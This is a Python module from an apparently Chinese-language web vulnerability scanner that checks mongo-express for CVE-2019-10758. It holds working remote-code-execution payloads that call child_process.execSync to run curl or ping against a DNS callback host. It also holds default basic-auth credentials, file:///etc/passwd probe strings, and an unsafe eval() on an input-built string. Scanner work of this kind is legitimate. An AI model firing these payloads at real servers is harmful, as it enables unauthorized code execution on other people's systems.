#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
mongo-express是一款mongodb的第三方Web界面, 使用node和express开发
    Mongo-Express扫描类: 
        mongo-express 未授权远程代码执行
            CVE-2019-10758
                Payload: https://vulhub.org/#/environments/mongo-express/CVE-2019-10758/

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from lib.tool import head
from payloads.MongoExpress.cve_2019_10758 import cve_2019_10758_scan

class MongoExpress():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'mongo-express'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2019_10758_payloads = [
            {
                'path': 'checkValid',
                'data': 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl DNSdomain")',
                'headers': head.merge(self.headers, {
                    'Authorization': 'Basic YWRtaW46cGFzcw=='
                })
                
            },
            {
                'path': 'checkValid',
                'data': 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ping DNSdomain")',
                'headers': head.merge(self.headers, {
                    'Authorization': 'Basic YWRtaW46cGFzcw=='
                })
            },
            {
                'path': 'checkValid',
                'data': 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl DNSdomain")',
                'headers': head.merge(self.headers, {})
                
            },
            {
                'path': 'checkValid',
                'data': 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ping DNSdomain")',
                'headers': head.merge(self.headers, {})
            }
        ]
    
    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2019_10758_scan, url=url)
        ]

MongoExpress.cve_2019_10758_scan = cve_2019_10758_scan

mongoexpress = MongoExpress()
